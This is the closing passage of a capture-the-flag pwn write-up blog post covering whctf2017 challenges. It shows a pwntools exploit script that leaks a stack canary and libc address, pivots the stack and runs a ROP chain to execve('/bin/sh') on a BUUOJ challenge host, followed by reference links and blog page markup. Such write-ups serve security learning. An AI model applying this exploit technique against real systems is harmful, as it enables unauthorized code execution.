+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26330&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">bss_addr=<span class="number">0x6020D8</span></span><br><span class="line">leave_ret=<span class="number">0x401218</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;u&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">16</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug(p,<span class="number">0x401219</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p64(canary)[::-<span class="number">1</span>]+p64(bss_addr-<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss_addr)+p64(e.plt[<span class="string">&#x27;gets&#x27;</span>])+p64(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">puts_addr=recv_libc()</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&quot;puts&quot;</span>,puts_addr,libc)</span><br><span class="line">pop_rdx=<span class="number">0x0000000000001b92</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">pop_rsi=<span class="number">0x00000000000202e8</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">execve=<span class="number">0x00000000000cc770</span>+(puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(execve)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="参考文章">参考文章</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/106694651">(whctf2017_stackoverflow ha1vk的博客-CSDN博客_whctf2017stackoverflow</a></p>
+<p><a target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write#%E4%BB%BB%E6%84%8F%E5%86%99">IO FILE 之任意读写 « 平凡路上 (ray-cp.github.io)</a></p>
+<p>[WHCTF 2017 note_sys | giantbranch’s blog](<a target="_blank" rel="noopener" href="https://www.giantbranch.cn/2017/12/11/WHCTF">https://www.giantbranch.cn/2017/12/11/WHCTF</a> 2017 note_sys/)</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/103089382">(44条消息) 攻防世界PWN之EasyPwn题解_ha1vk的博客-CSDN博客_pwn-sai_easy 解题思路</a></p>
+<p><a target="_blank" rel="noopener" href="https://roderickchan.github.io/2022/04/15/BUUCTF-pwn-tasks-20/#whctf2017-rc4">BUUCTF-pwn合集 - Lynne’s House (roderickchan.github.io)</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://zikh26.github.io">ZIKH26</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zikh26.github.io/posts/1694f8f0.html">https://zikh26.github.io/posts/1694f8f0.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zikh26.github.io" target="_blank">ZIKH26's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/IO-FILE-attack/">IO_FILE attack</a></div><div class="post_share"><div class="social-share" data-image="/img/22.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/729cf436.html"><img class="prev-cover" src="/img/nvhai.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">一次简单的远程Getshell（在目标机上开启一个shell）</div></div></a></div><div class="next-post pull-right"><a href="/posts/ebc85e8a.html"><img class="next-cover" src="/img/31.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">wdb_2018_1st_babyheap</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/me.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ZIKH26</div><div class="author-info__description">万古凡间一过客，九天之上第一仙</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">94</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZIKH26"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ZIKH26" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2777256035@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#whctf2017-stackoverflow"><span class="toc-number">2.</span> <span class="toc-text">whctf2017_stackoverflow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5"><span class="toc-number">2.1.</span> <span class="toc-text">保护策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%80%E5%9C%A8"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞所在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">2.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">2.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#whctf2017-note-sys"><span class="toc-number">3.</span> <span class="toc-text">whctf2017_note_sys</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5-v2"><span class="toc-number">3.1.</span> <span class="toc-text">保护策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%80%E5%9C%A8-v2"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞所在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-v2"><span class="toc-number">3.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-v2"><span class="toc-number">3.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#whctf2017-easypwn"><span class="toc-number">4.</span> <span class="toc-text">whctf2017_easypwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5-v3"><span class="toc-number">4.1.</span> <span class="toc-text">保护策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%80%E5%9C%A8-v3"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞所在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-v3"><span class="toc-number">4.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-v3"><span class="toc-number">4.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#whctf2017-rc4"><span class="toc-number">5.</span> <span class="toc-text">whctf2017_rc4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E7%AD%96%E7%95%A5-v4"><span class="toc-number">5.1.</span> <span class="toc-text">保护策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%80%E5%9C%A8-v4"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞所在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-v4"><span class="toc-number">5.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-v4"><span class="toc-number">5.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">6.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/fabe43ff.html" title="关于qemu逃逸的学习总结"><img src="/img/23.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于qemu逃逸的学习总结"/></a><div class="content"><a class="title" href="/posts/fabe43ff.html" title="关于qemu逃逸的学习总结">关于qemu逃逸的学习总结</a><time datetime="2023-05-14T15:14:50.168Z" title="发表于 2023-05-14 23:14:50">2023-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/12414989.html" title="关于tcache stashing unlink attack的学习总结"><img src="/img/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于tcache stashing unlink attack的学习总结"/></a><div class="content"><a class="title" href="/posts/12414989.html" title="关于tcache stashing unlink attack的学习总结">关于tcache stashing unlink attack的学习总结</a><time datetime="2023-05-14T15:14:50.168Z" title="发表于 2023-05-14 23:14:50">2023-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/75ba47d9.html" title="关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题"><img src="/img/20.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题"/></a><div class="content"><a class="title" href="/posts/75ba47d9.html" title="关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题">关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</a><time datetime="2023-05-14T15:14:50.168Z" title="发表于 2023-05-14 23:14:50">2023-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/afa5cfa3.html" title="关于unlink的学习总结"><img src="/img/8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于unlink的学习总结"/></a><div class="content"><a class="title" href="/posts/afa5cfa3.html" title="关于unlink的学习总结">关于unlink的学习总结</a><time datetime="2023-05-14T15:14:50.168Z" title="发表于 2023-05-14 23:14:50">2023-05-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ccd7886.html" title="关于vm pwn的学习总结"><img src="/img/25.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于vm pwn的学习总结"/></a><div class="content"><a class="title" href="/posts/ccd7886.html" title="关于vm pwn的学习总结">关于vm pwn的学习总结</a><time datetime="2023-05-14T15:14:50.168Z" title="发表于 2023-05-14 23:14:50">2023-05-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/22.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By ZIKH26</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi，欢迎来<a href="https://zikh26.github.io/">我的博客</a>!!!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'GEgJnxmVMmtk5TO9ntcgogeL-gzGzoHsz',
+      appKey: 'FJXLkmbCYXC6IqkCRKgQzTJf',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="/js/sun_moon.js" async></script><link rel="stylesheet" href="/css/font.css"><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
